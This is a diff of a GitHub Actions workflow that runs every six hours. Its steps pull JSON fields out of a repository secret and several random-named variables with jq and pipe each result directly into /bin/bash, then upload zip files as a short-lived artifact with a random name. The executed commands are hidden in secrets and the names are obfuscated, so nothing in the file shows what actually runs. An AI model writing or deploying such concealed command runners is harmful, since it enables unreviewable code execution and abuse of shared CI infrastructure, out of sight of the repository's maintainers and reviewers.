@@ -1,23 +1,27 @@
 name: langminghongcai
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '5 1/6 * * *'
-jobs:  # 32040
+    - cron: '51 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: langminghongcai
         env:
-          t4565: ${{ secrets.t4565 }}
+          k24489: ${{ secrets.k24489 }}
         run: |
-          echo $t4565 | jq -r .hrk16064 | /bin/bash
-          echo $cmqnz179 | jq -r .whsp20158 | /bin/bash
-          echo $a8 | jq -r .nagxx5 | /bin/bash
-          echo $zpt4011 | jq -r .dsre453 | /bin/bash
-          echo $snqqz9485 | jq -r .jqamu81 | /bin/bash
-          echo $krli51 | jq -r .y35 | /bin/bash
+          printf '%s' "$k24489" | jq -r .jmbxj4 | /bin/bash
+          echo $ddh9130 | jq -r .if7441 | /bin/bash
+          echo $cib4279 | jq -r .e1 | /bin/bash
+          echo $w732 | jq -r .tplgg494 | /bin/bash
+          printf '%s' "$zy48739" | jq -r .asgdv555 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: IOmWqX0v
+          path: "*.zip"
+          retention-days: 1
